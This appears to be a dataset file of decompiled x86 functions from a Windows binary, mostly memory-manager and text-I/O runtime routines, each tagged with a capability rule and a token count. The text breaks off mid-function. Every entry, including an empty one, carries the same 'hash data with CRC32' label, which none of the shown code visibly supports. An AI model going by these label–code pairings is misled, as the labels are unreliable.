{
    "004013bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.004013bc(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0040168c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040168c(void)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x49571c;\n    if (*0x495720 == 0) {\n        return;\n    }\n    if ((*(*0x49571c + -4) & 1) == 0) {\n        *(*0x49571c + -4) = *(*0x49571c + -4) | 8;\n        piVar3 = iVar5 - *0x495720;\n        uVar4 = *0x495720;\n    }\n    else {\n        uVar4 = *(*0x49571c + -4) & 0xfffffff0;\n        if (0xb2f < uVar4) {\n            fcn.004015ec();\n            uVar4 = *(*0x49571c + -4) & 0xfffffff0;\n        }\n        piVar3 = *0x49571c - *0x495720;\n        uVar4 = uVar4 + *0x495720;\n    }\n    piVar3[-1] = uVar4 + 3;\n    *((uVar4 - 8) + piVar3) = uVar4;\n    if (uVar4 < 0xb30) {\n        return;\n    }\n    uVar4 = uVar4 - 0xb30 >> 8;\n    iVar5 = (uVar4 - 0x3ff & -(uVar4 < 0x3ff)) + 0x3ff;\n    uVar4 = iVar5 * 8;\n    ppiVar2 = *(uVar4 + 0x4957ac);\n    *piVar3 = uVar4 + 0x4957a8;\n    piVar3[1] = ppiVar2;\n    *ppiVar2 = piVar3;\n    *(uVar4 + 0x4957ac) = piVar3;\n    if (ppiVar2 != uVar4 + 0x4957a8) {\n        return;\n    }\n    uVar4 = uVar4 >> 8 & 0xff;\n    puVar1 = uVar4 * 4 + 0x495728;\n    *puVar1 = *puVar1 | 1 << (iVar5 & 0x1f);\n    *0x495724 = *0x495724 | 1 << (uVar4 & 0x1f);\n    return;\n}\n",
        "token_count": 567
    },
    "00401d90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00401d90(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t **in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **ppuVar6;\n    uint32_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint *puVar11;\n    uchar auStack32 [8];\n    uint uStack24;\n    uint8_t **ppuStack20;\n    \n    ppuVar8 = in_EAX[-1];\n    if ((ppuVar8 & 7) != 0) {\n        if ((ppuVar8 & 5) != 0) {\n            if ((ppuVar8 & 3) != 0) {\n                return -1;\n            }\n            ppuVar8 = in_EAX + -4;\n            fcn.00401770();\n            if ((in_EAX[-1] & 8) == 0) {\n                puVar11 = NULL;\n                iVar5 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000, *ppuVar8, in_EAX[-3]);\n                ppuVar6 = ppuVar8;\n                if (iVar5 == 0) {\n                    iVar5 = -1;\n                }\n                else {\n                    iVar5 = 0;\n                }\n            }\n            else {\n                uVar7 = in_EAX[-1] & 0xfffffff0;\n                iVar5 = 0;\n                while( true ) {\n                    sub.kernel32.dll_VirtualQuery(ppuVar8, &stack0xffffffe0);\n                    puVar11 = NULL;\n                    ppuVar6 = ppuVar8;\n                    iVar3 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000);\n                    if (iVar3 == 0) break;\n                    if (uVar7 < 0x1d) goto code_r0x00401897;\n                    uVar7 = uVar7 - 0x1c;\n                    ppuVar8 = ppuVar8 + 7;\n                }\n                iVar5 = -1;\n            }\ncode_r0x00401897:\n            if (iVar5 == 0) {\n                *puVar11 = ppuVar6;\n                ppuVar6[1] = puVar11;\n            }\n            *0x4977a8 = 0;\n            return iVar5;\n        }\n        goto code_r0x00401e91;\n    }\n    puVar9 = *ppuVar8;\n    ppuVar6 = in_EAX;\n    if (*0x49504d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar1 = *puVar9;\n            *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n            ppuVar6 = in_EAX;\n            if (uVar1 == 0) break;\n            if (*0x4955b5 == '\\0') {\n                in_EAX = NULL;\n                ppuStack20 = 0x401e2b;\n                ppuVar6 = ppuVar8;\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                uVar1 = *puVar9;\n                *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n                ppuVar8 = in_EAX;\n                if (uVar1 == 0) break;\n                ppuStack20 = 0xa;\n                uStack24 = 0x401e45;\n                sub.kernel32.dll_Sleep();\n                ppuVar8 = ppuStack20;\n            }\n        }\n    }\n    in_EAX = ppuVar8;\n    ppuVar8 = in_EAX + 3;\n    *ppuVar8 = *ppuVar8 + -1;\n    puVar4 = in_EAX[2];\n    if (*ppuVar8 != NULL) {\n        in_EAX[2] = ppuVar6;\n        ppuVar6[-1] = puVar4 + 1;\n        if (puVar4 != NULL) {\n            *puVar9 = 0;\n            return 0;\n        }\n        puVar4 = *(puVar9 + 4);\n        in_EAX[5] = puVar9;\n        in_EAX[1] = puVar4;\n        *(puVar4 + 0x14) = in_EAX;\n        *(puVar9 + 4) = in_EAX;\n        *puVar9 = 0;\n        return 0;\n    }\n    if (puVar4 == NULL) {\ncode_r0x00401df7:\n        *(puVar9 + 0xc) = puVar4;\n    }\n    else {\n        puVar4 = in_EAX[5];\n        puVar2 = in_EAX[1];\n        *(puVar4 + 4) = puVar2;\n        *(puVar2 + 0x14) = puVar4;\n        puVar4 = NULL;\n        if (*(puVar9 + 0x10) == in_EAX) goto code_r0x00401df7;\n    }\n    *puVar9 = puVar4;\n    ppuVar8 = in_EAX[-1];\ncode_r0x00401e91:\n    puVar9 = ppuVar8 & 0xfffffff0;\n    if (*0x49504d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar10 = *0x495718 == 0;\n            *0x495718 = *0x495718 ^ bVar10 * (*0x495718 ^ 1);\n            if (bVar10) break;\n            if (*0x4955b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar10 = *0x495718 == 0;\n                *0x495718 = *0x495718 ^ bVar10 * (*0x495718 ^ 1);\n                if (bVar10) break;\n                ppuStack20 = 0x401e83;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if ((*(puVar9 + -4 + in_EAX) & 1) == 0) {\n        *(puVar9 + -4 + in_EAX) = *(puVar9 + -4 + in_EAX) | 8;\n    }\n    else {\n        uVar7 = *(puVar9 + -4 + in_EAX) & 0xfffffff0;\n        puVar9 = puVar9 + uVar7;\n        if (0xb2f < uVar7) {\n            fcn.004015ec();\n        }\n    }\n    if ((*(in_EAX + -1) & 8) != 0) {\n        puVar4 = in_EAX[-2];\n        in_EAX = in_EAX - puVar4;\n        puVar9 = puVar9 + puVar4;\n        if (0xb2f < puVar4) {\n            fcn.004015ec();\n        }\n    }\n    if (puVar9 != 0x13ffe0) {\n        in_EAX[-1] = puVar9 + 3;\n        *(puVar9 + -8 + in_EAX) = puVar9;\n        fcn.0040162c();\n        *0x495718 = 0;\n        return 0;\n    }\n    if (*0x495720 == 0x13ffe0) {\n        ppuStack20 = in_EAX + -4;\n        puVar9 = *ppuStack20;\n        ppuVar8 = in_EAX[-3];\n        *(puVar9 + 4) = ppuVar8;\n        *ppuVar8 = puVar9;\n        *0x495718 = 0;\n        uStack24 = 0x401f3d;\n        iVar5 = sub.kernel32.dll_VirtualFree();\n        return -(iVar5 == 0);\n    }\n    fcn.0040168c();\n    in_EAX[0x4fff7] = 0x2;\n    *0x495718 = 0;\n    *0x49571c = in_EAX + 0x4fff8;\n    *0x495720 = 0x13ffe0;\n    return 0;\n}\n",
        "token_count": 1875
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004024a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004024a4(int32_t lpBuffer)\n\n{\n    uint32_t in_EAX;\n    \n    if ((0xffff < in_EAX) && ((in_EAX & 3) == 0)) {\n        if ((in_EAX < *(lpBuffer + -0x1c)) || (*(lpBuffer + -0x1c) + *(lpBuffer + -0x10) < in_EAX + 4)) {\n            *(lpBuffer + -0x10) = 0;\n            sub.kernel32.dll_VirtualQuery();\n        }\n        if ((((3 < *(lpBuffer + -0x10)) && (*(lpBuffer + -0xc) == 0x1000)) && ((*(lpBuffer + -8) & 0xf6) != 0)) &&\n           ((*(lpBuffer + -7) & 1) == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 206
    },
    "004026d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026d4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = arg_8h + -0x1b800 + (*in_EAX - 0x49104cU >> 5) * 0x800;\n    fcn.00402334();\n    do {\n        if (var_1ch < var_18h) {\n            return;\n        }\n        if (((*(var_18h + -1) & 1) == 0) && (cVar3 = fcn.0040267c(),  cVar3 == '\\0')) {\n            *(arg_8h + -0x1b801) = 0;\n            iVar6 = 0;\n            iVar5 = fcn.004025a0();\n            if (iVar5 == 0) {\n                if (((*var_18h < 0x100) && (var_20h = var_18h[1],  0 < var_20h)) && (var_20h <= *(*in_EAX + 2) - 0xd)) {\n                    var_10h = var_18h + 2;\n                    bVar4 = true;\n                    if (0 < var_20h) {\n                        do {\n                            if (((bVar4) && (0x1f < *var_10h)) && (*var_10h < 0x80)) {\n                                bVar4 = true;\n                            }\n                            else {\n                                bVar4 = false;\n                            }\n                            var_10h = var_10h + 1;\n                            var_20h = var_20h - 1;\n                        } while (var_20h != 0);\n                    }\n                    if ((bVar4) && (*var_10h == 0)) {\n                        iVar6 = 1;\n                    }\n                }\n            }\n            else {\n                iVar6 = 2;\n                do {\n                    if ((iVar5 == *(iVar2 + iVar6 * 8)) || (*(iVar2 + iVar6 * 8) == 0)) break;\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x100);\n                if (iVar6 < 0x100) {\n                    *(iVar2 + iVar6 * 8) = iVar5;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            piVar1 = iVar2 + 4 + iVar6 * 8;\n            *piVar1 = *piVar1 + 1;\n        }\n        var_18h = var_18h + *(*in_EAX + 2);\n    } while( true );\n}\n",
        "token_count": 671
    },
    "00402820": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00402820(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uchar auStackY131117 [2049];\n    int32_t aiStackY129068 [4096];\n    int32_t *piStackY112684;\n    uint16_t *puStackY112680;\n    int32_t iStackY112676;\n    int32_t iStackY112672;\n    int32_t iStackY112668;\n    int32_t iStackY112664;\n    int32_t iStackY112660;\n    char cStackY112654;\n    char cStackY112653;\n    int32_t iStackY112652;\n    char cStackY112645;\n    int32_t aiStackY110600 [26035];\n    uint var_4h;\n    \n    iVar3 = 0x27;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00403af4();\n    fcn.00403af4();\n    iStackY112652 = 0;\n    cStackY112645 = '\\x01';\n    for (iVar3 = *0x49570c; iVar4 = *0x4977b0,  iVar3 != 0x495708; iVar3 = *(iVar3 + 4)) {\n        iVar4 = fcn.004022f4();\n        while (iVar4 != 0) {\n            uVar1 = *(iVar4 + -4);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 4) == 0) {\n                    if (iStackY112652 < 0x1000) {\n                        iStackY112664 = (uVar1 & 0xfffffff0) - 4;\n                        cVar2 = fcn.0040267c();\n                        if (cVar2 == '\\0') {\n                            cStackY112645 = '\\0';\n                            aiStackY129068[iStackY112652] = iStackY112664;\n                            iStackY112652 = iStackY112652 + 1;\n                        }\n                    }\n                }\n                else {\n                    fcn.004026d4(&stack0xfffffffc);\n                }\n            }\n            iVar4 = fcn.004022d0();\n        }\n    }\n    while ((iVar4 != 0x4977ac && (iStackY112652 < 0x1000))) {\n        cVar2 = fcn.0040267c();\n        if (cVar2 == '\\0') {\n            cStackY112645 = '\\0';\n            aiStackY129068[iStackY112652] = (*(iVar4 + 0xc) & 0xfffffff0) - 0x14;\n            iStackY112652 = iStackY112652 + 1;\n        }\n        iVar4 = *(iVar4 + 4);\n    }\n    if (cStackY112645 == '\\0') {\n        cStackY112653 = '\\0';\n        iStackY112668 = 0;\n        puVar5 = fcn.0040248c();\n        iStackY112660 = 0x37;\n        puStackY112680 = 0x49104e;\n        piStackY112684 = aiStackY110600;\n        do {\n            iStackY112672 = *puStackY112680 - 4;\n            cStackY112654 = '\\0';\n            iVar3 = 0xff;\n            piVar6 = piStackY112684;\n            do {\n                if (auStackY131117 < puVar5) break;\n                if (*piVar6 != 0) {\n                    if (cStackY112653 == '\\0') {\n                        puVar5 = fcn.0040248c();\n                        cStackY112653 = '\\x01';\n                    }\n                    if (cStackY112654 == '\\0') {\n                        *puVar5 = 0xd;\n                        puVar5[1] = 10;\n                        puVar5 = fcn.00402370();\n                        *puVar5 = 0x20;\n                        puVar5[1] = 0x2d;\n                        puVar5[2] = 0x20;\n                        fcn.00402370();\n                        fcn.0040248c();\n                        cStackY112654 = '\\x01';\n                    }\n                    else {\n                        *puVar5 = 0x2c;\n                        puVar5[1] = 0x20;\n                    }\n                    if (iVar3 == 0) {\n                        puVar5 = fcn.0040248c();\n                    }\n                    else if (iVar3 == 1) {\n                        puVar5 = fcn.0040248c();\n                    }\n                    else {\n                        fcn.00404530();\n                        puVar5 = fcn.0040248c();\n                    }\n                    *puVar5 = 0x20;\n                    puVar5[1] = 0x78;\n                    puVar5[2] = 0x20;\n                    puVar5 = fcn.00402370();\n                }\n                iVar3 = iVar3 + -1;\n                piVar6 = piVar6 + -2;\n            } while (iVar3 != -1);\n            iStackY112668 = iStackY112672;\n            piStackY112684 = piStackY112684 + 0x200;\n            puStackY112680 = puStackY112680 + 0x10;\n            iStackY112660 = iStackY112660 + -1;\n        } while (iStackY112660 != 0);\n        if (0 < iStackY112652) {\n            if (cStackY112653 != '\\0') {\n                *puVar5 = 0xd;\n                puVar5[1] = 10;\n                puVar5[2] = 0xd;\n                puVar5[3] = 10;\n            }\n            puVar5 = fcn.0040248c();\n            iStackY112676 = 0;\n            iVar3 = iStackY112652;\n            do {\n                if (iStackY112676 != 0) {\n                    *puVar5 = 0x2c;\n                    puVar5[1] = 0x20;\n                }\n                puVar5 = fcn.00402370();\n                if (auStackY131117 < puVar5) break;\n                iStackY112676 = iStackY112676 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.0040248c();\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 1482
    },
    "00403abc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00403abc(void)\n\n{\n    char extraout_AH;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) == -0x284f) && (*(in_EAX + 0xc) < *(in_EAX + 0x10))) {\n        if (((*(in_EAX + 6) & 1) == 0) || (*(*(in_EAX + 0xc) + *(in_EAX + 0x14)) != '\\x1a')) {\n            return 0;\n        }\n    }\n    else {\n        fcn.00403bcc();\n        if (extraout_AH != '\\x1a') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 188
    },
    "00403bcc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00403bcc(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 4) != -0x284f) {\n        cVar2 = fcn.00403b90();\n        if (cVar2 == '\\0') goto code_r0x00403c2e;\n    }\n    uVar4 = *(in_EAX + 0xc);\n    if (*(in_EAX + 0x10) <= uVar4) {\n        iVar3 = (**(in_EAX + 0x1c))();\n        if (iVar3 != 0) {\n            fcn.0040307c();\n            goto code_r0x00403c2e;\n        }\n        uVar4 = *(in_EAX + 0xc);\n        if (*(in_EAX + 0x10) <= uVar4) {\n            if ((*(in_EAX + 6) & 1) != 0) {\n                *(uVar4 + *(in_EAX + 0x14)) = 0x1a;\n                *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n            }\n            goto code_r0x00403c2e;\n        }\n    }\n    uVar1 = *(uVar4 + *(in_EAX + 0x14));\n    if (((*(in_EAX + 6) & 1) == 0) || (uVar1 != 0x1a)) {\n        *(in_EAX + 0xc) = uVar4 + 1;\n        return uVar1;\n    }\ncode_r0x00403c2e:\n    return CONCAT31(CONCAT21(in_EAX >> 0x10, 0x1a), 0x1a);\n}\n",
        "token_count": 423
    },
    "00403c38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403c38(int32_t param_1, char *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar6;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    int32_t iVar5;\n    \n    iVar7 = param_1;\n    if (((*(in_EAX + 4) == -0x284f) || (cVar2 = fcn.00403b90(),  cVar2 != '\\0')) && (unaff_EBX = in_EAX,  0 < param_1))\n    {\n        puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n        do {\n            while( true ) {\n                iVar4 = iVar5 + -1;\n                if (iVar5 < 1) {\n                    *(in_EAX + 0xc) = puVar6;\n                    uVar3 = fcn.00403bcc(iVar7);\n                    iVar4 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n                    puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n                    if (uVar3 >> 8 != '\\0') {\n                        return in_EAX;\n                    }\n                }\n                else {\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                }\n                cVar2 = uVar3;\n                if (cVar2 == '\\n') goto code_r0x00403c8c;\n                iVar5 = iVar4;\n                if (cVar2 == '\\r') break;\n                if ((cVar2 == '\\x1a') && ((*(in_EAX + 6) & 1) != 0)) goto code_r0x00403c8d;\n                *param_2 = cVar2;\n                iVar4 = param_1 + -1;\n                bVar1 = param_1 < 1;\n                param_1 = iVar4;\n                param_2 = param_2 + 1;\n                if (iVar4 == 0 || bVar1) goto code_r0x00403c8d;\n            }\n        } while (*puVar6 != 10);\ncode_r0x00403c8c:\n        puVar6 = puVar6 + -1;\ncode_r0x00403c8d:\n        *(in_EAX + 0xc) = puVar6 - *(in_EAX + 0x14);\n    }\n    return unaff_EBX;\n}\n",
        "token_count": 619
    },
    "004040ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.004040ac(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uStack12;\n    \n    if ((*(in_EAX + 6) & 1) == 0) {\n        uStack12 = CONCAT31(param_1 >> 8, 10);\n        uVar1 = fcn.00403fdc();\n    }\n    else {\n        uStack12 = param_1 & 0xffff0000 | 0xa0d;\n        uVar1 = fcn.00403fdc();\n    }\n    fcn.0040382c();\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 160
    },
    "0040a8bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t * __fastcall fcn.0040a8bc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint16_t *puVar3;\n    \n    param_2 = param_2 - in_EAX;\n    puVar3 = in_EAX;\n    if ((in_EAX & 1) != 0) {\n        cVar1 = *(param_2 + in_EAX);\n        *in_EAX = cVar1;\n        if (cVar1 == '\\0') {\n            return in_EAX;\n        }\n        puVar3 = in_EAX + 1;\n    }\n    do {\n        if (*(param_2 + puVar3) == '\\0') {\n            *puVar3 = '\\0';\n            return in_EAX;\n        }\n        uVar2 = *(param_2 + puVar3);\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n    } while (0xff < uVar2);\n    return in_EAX;\n}\n",
        "token_count": 245
    },
    "0040ef44": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef44(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x40f08d;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if ((arg_ch & 2) == 0) {\n        fcn.004055c8();\n        fcn.004055c8();\n    }\n    else {\n        puStack48 = &stack0xfffffffc;\n        fcn.00409aa8();\n        fcn.00409aa8();\n    }\n    fcn.004055c8();\n    fcn.00405530();\n    do {\n        if (var_4h == 0) {\ncode_r0x0040f06a:\n            *in_FS_OFFSET = puStack56;\n            puStack48 = 0x40f094;\n            uStack52 = 0x40f07f;\n            fcn.00405530();\n            uStack52 = 0x40f08c;\n            fcn.00405554();\n            return;\n        }\n        iVar1 = fcn.0040e8cc();\n        if (iVar1 == 0) {\n            fcn.00405818();\n            goto code_r0x0040f06a;\n        }\n        fcn.00405a44(&fcn.0040ef44::var_1ch, *arg_8h);\n        fcn.004058e0(var_14h, var_1ch);\n        fcn.00405a44(&fcn.0040ef44::var_ch);\n        if ((arg_ch & 1) == 0) {\n            fcn.00405818();\n            goto code_r0x0040f06a;\n        }\n        var_18h = var_8h;\n        if (var_8h != 0) {\n            var_18h = *(var_8h + -4);\n        }\n        puStack56 = &fcn.0040ef44::var_4h;\n        fcn.00405a44();\n    } while( true );\n}\n",
        "token_count": 603
    },
    "0041d39c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d39c(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 71
    },
    "0041d670": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d670(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x41d894;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41d6a6;\n    (**(*in_EAX + 0x28))();\n    puStack72 = 0x41d6b1;\n    fcn.0041e9e4();\n    puStack72 = 0x41d6bc;\n    fcn.0041e9e4();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x41d864;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x41d6fd;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d41c(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x41d6f4;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d5cc(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x41d822;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.0041d2bc(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.0041d334(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.0041d52c(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00404f70();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41d89b;\n            uStack76 = 0x41d885;\n            fcn.00405554();\n            uStack76 = 0x41d893;\n            fcn.00406934();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.0041d334(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.0041d334(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.0040484c();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.0041d280(&stack0xfffffffc);\n            fcn.00419740();\n        }\n        else {\n            iVar3 = fcn.004198f4();\n            if (iVar3 < 0) {\n                fcn.0041d280(&stack0xfffffffc);\n                fcn.00419740();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1025
    },
    "0042021c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0042021c(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.00419980();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x420274 != (*0x420274 & *(in_EAX + 0x1c)))) {\n            fcn.00420158();\n        }\n        else {\n            fcn.004201e4();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0042473c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042482d)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042473c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStackY148;\n    int32_t iStack120;\n    uint uStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack100 = &stack0xfffffffc;\n    uStack104 = 0x424958;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) != 0) {\n        *in_FS_OFFSET = iStack108;\n        puStack100 = 0x42495f;\n        uStack104 = 0x424957;\n        fcn.00405554();\n        return;\n    }\n    puStack112 = 0x424780;\n    fcn.00423a1c();\n    uStack116 = 0x424930;\n    iStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    if (*(var_4h + 8) == 0) {\n        var_40h = *(var_4h + 0x14);\n        var_3ch = 0;\n        var_38h = *(var_4h + 0x18);\n        if ((*(var_4h + 0x1d) & 1) == 0) {\n            var_30h = 400;\n        }\n        else {\n            var_30h = 700;\n        }\n        var_2ch._0_1_ = (*(var_4h + 0x1d) & 2) != 0;\n        var_2ch._1_1_ = (*(var_4h + 0x1d) & 4) != 0;\n        var_2ch._2_1_ = (*(var_4h + 0x1d) & 8) != 0;\n        